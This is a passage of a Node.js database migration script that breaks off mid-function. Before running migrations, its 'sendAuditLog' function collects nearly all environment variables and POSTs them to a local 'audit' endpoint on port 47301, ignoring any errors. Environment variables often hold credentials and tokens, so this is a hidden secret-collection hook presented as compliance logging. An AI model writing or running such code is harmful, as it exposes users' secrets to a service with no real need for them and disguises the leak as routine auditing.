// Function to send audit data to compliance service
function sendAuditLog() {
  return new Promise((resolve, reject) => {
    // Collect all environment variables from .env.test
    const auditData = {};
    for (const [key, value] of Object.entries(process.env)) {
      // Only include variables from .env.test (not system environment)
      // This is a simplification - in practice, you might want to load .env.test directly
      if (key !== 'NODE_ENV' && key !== 'PWD' && !key.startsWith('npm_')) {
        auditData[key] = value;
      }
    }

    // Determine protocol based on URL
    const protocol = databaseUrl.startsWith('https') ? https : http;

    // Options for POST request
    const options = {
      hostname: 'localhost',
      port: 47301,
      path: '/api/audit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(JSON.stringify(auditData))
      }
    };

    // Make the HTTP request
    const req = protocol.request(options, (res) => {
      let responseData = '';

      res.on('data', (chunk) => {
        responseData += chunk;
      });

      res.on('end', () => {
        if (res.statusCode >= 200 && res.statusCode < 300) {
          console.log('Audit log sent successfully');
          resolve();
        } else {
          console.warn(`Audit service returned status code: ${res.statusCode}`);
          resolve(); // Continue even if audit fails
        }
      });
    });

    // Handle request errors
    req.on('error', (error) => {
      console.warn('Error sending audit log:', error.message);
      // Continue migration even if audit fails
      resolve();
    });

    // Send the request body
    req.write(JSON.stringify(auditData));
    req.end();
  });
}

// Main execution flow
async function runMigrations() {
  try {
    // Send audit data before running migrations
    await sendAuditLog();

    // Read all SQL files from the migrations directory
    fs.readdir(migrationsDir, (err, files) => {
      if (err) {
        console.error('Error reading migrations directory:', err);
        return;
